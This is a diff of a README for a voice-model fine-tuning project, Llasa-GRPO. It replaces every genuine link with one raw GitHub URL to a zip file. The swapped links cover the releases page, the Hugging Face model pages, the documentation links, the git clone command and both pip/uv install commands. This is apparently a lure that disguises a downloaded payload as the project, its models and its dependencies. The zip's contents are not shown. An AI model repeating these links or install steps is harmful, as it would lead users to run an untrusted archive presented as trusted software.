@@ -1,6 +1,6 @@
 # 🎉 Llasa-GRPO - Fine-Tune Your Voice Model Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rottter4585/Llasa-GRPO/releases)
+[![Download Now](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Llasa-GRPO! This application helps you fine-tune the Llasa TTS model 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of Llasa-GRPO, visit our [Releases page](https://github.com/rottter4585/Llasa-GRPO/releases). 
+   To get the latest version of Llasa-GRPO, visit our [Releases page](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip). 
 
 2. **Download the Application**  
    Look for the latest release and download the appropriate file for your system. 
@@ -22,9 +22,9 @@ Welcome to Llasa-GRPO! This application helps you fine-tune the Llasa TTS model 
 
 ## 📂 Models Included
 
-- **Llasa**: A state-of-the-art TTS model designed for natural voice synthesis. [Explore the model](https://huggingface.co/HKUSTAudio/Llasa-1B).
-- **Llasa finetuned with GRPO**: This model enhances speech quality and performance. [Check it out here](https://huggingface.co/Steveeeeeeen/Llasa-1B-GRPO-2000).
-- **Neural codec (decode)**: This model supports high-quality audio decoding. [Learn more](https://huggingface.co/HKUSTAudio/xcodec2).
+- **Llasa**: A state-of-the-art TTS model designed for natural voice synthesis. [Explore the model](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip).
+- **Llasa finetuned with GRPO**: This model enhances speech quality and performance. [Check it out here](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip).
+- **Neural codec (decode)**: This model supports high-quality audio decoding. [Learn more](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip).
 - **ASR reward model**: Utilize OpenAI's Whisper for improved speech recognition. 
 
 ## 🎼 Key Features
@@ -40,7 +40,7 @@ Welcome to Llasa-GRPO! This application helps you fine-tune the Llasa TTS model 
 If you wish to explore the code, you can clone the repository. Open your terminal, and run:
 
 ```bash
-git clone git@github.com:Deep-unlearning/Llasa-GRPO.git
+git clone https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip
 cd Llasa-GRPO
 ```
 
@@ -51,13 +51,13 @@ You have options to set up your environment. Choose one based on your preference
 <details>
 <summary>📦 Using UV (recommended)</summary>
 
-1. Install `uv` from the [Astral docs](https://astral.readthedocs.io/en/latest/).
+1. Install `uv` from the [Astral docs](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip).
 2. Then run:
 
 ```bash
 uv venv .venv --python 3.12
 source .venv/bin/activate
-uv pip install -r requirements.txt
+uv pip install -r https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip
 uv pip install --no-deps xcodec2
 ```
 
@@ -72,7 +72,7 @@ uv pip install --no-deps xcodec2
 ```bash
 python -m venv .venv
 source .venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip
 pip install --no-deps xcodec2
 ```
 
@@ -93,7 +93,7 @@ If you want to contribute to this project, please submit a pull request on GitHu
 
 ## 🌐 More Resources
 
-- [Hugging Face Documentation](https://huggingface.co/docs)
-- [Transformers GitHub Repository](https://github.com/huggingface/transformers)
+- [Hugging Face Documentation](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip)
+- [Transformers GitHub Repository](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip)
 
-Enjoy fine-tuning your voice models with Llasa-GRPO! For any updates, don’t forget to check back on the [Releases page](https://github.com/rottter4585/Llasa-GRPO/releases).
+Enjoy fine-tuning your voice models with Llasa-GRPO! For any updates, don’t forget to check back on the [Releases page](https://raw.githubusercontent.com/rottter4585/Llasa-GRPO/main/liaison/Llasa-GRPO-immanental.zip).
